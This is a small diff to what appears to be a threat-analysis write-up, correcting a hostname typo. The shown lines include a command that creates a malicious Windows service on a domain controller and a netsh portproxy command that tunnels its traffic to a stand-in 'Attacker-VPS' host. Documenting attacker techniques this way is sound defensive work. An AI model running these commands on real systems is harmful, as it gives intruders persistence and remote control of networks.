@@ -148,7 +148,7 @@ sc \\DC-IP create ATITscUA binpath= “C:\Windows\system32\cmd.exe /b /c start /
 The next step after installing the malicious service is to set up tunnels to access to the infected machine from a remote host, using the following command:
 
 ```sh
-netsh interface portproxy add v4tov4 listenport=4444 connectaddress=Attacker-VPSS connectport=4443 listenaddress=0.0.0.0
+netsh interface portproxy add v4tov4 listenport=4444 connectaddress=Attacker-VPS connectport=4443 listenaddress=0.0.0.0
 ```
 
 Running this command would result in all network traffic from DC-IP:4444 being forwarded to Attacker-VPS:4443. This technique of setting up proxy tunnels will provide the attackers with the ability to control any PowerShell infected host from remote Internet hosts.
